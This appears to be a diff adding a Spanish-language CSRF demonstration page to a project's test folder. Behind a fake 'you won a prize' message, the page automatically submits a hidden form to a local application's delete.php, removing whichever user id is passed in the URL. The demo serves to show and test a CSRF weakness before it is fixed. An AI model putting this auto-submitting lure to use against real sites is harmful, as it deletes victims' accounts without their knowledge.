@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Sitio atacante (DEMOSTRACIÓN de CSRF)</title>
+    <!--
+        Página del ATACANTE, solo para la demostración de la mejora 6 (ver tests/csrf-demo/README.md).
+        No está en src/: no forma parte de la aplicación. Contiene un formulario oculto que apunta a
+        delete.php de la aplicación y se envía solo al abrir la página. Si la víctima tiene la sesión
+        iniciada en la aplicación, su navegador adjunta la cookie a esa petición aunque la haya originado
+        ESTA página: eso es CSRF (Cross-Site Request Forgery).
+
+        Uso:  http://127.0.0.1:9000/attack.html?id=14   (id = el usuario que se quiere eliminar)
+        Cambia ACTION si la aplicación no está en http://localhost:8080.
+    -->
+</head>
+<body>
+    <h1>¡Has ganado un premio!</h1>
+    <p>Cargando tu premio…</p>
+
+    <form id="trap" method="post" action="http://localhost:8080/delete.php">
+        <input type="hidden" name="id" value="">
+    </form>
+
+    <script>
+        const id = new URLSearchParams(location.search).get('id') || '1';
+        document.querySelector('#trap input[name=id]').value = id;
+        document.getElementById('trap').submit();
+    </script>
+</body>
+</html>
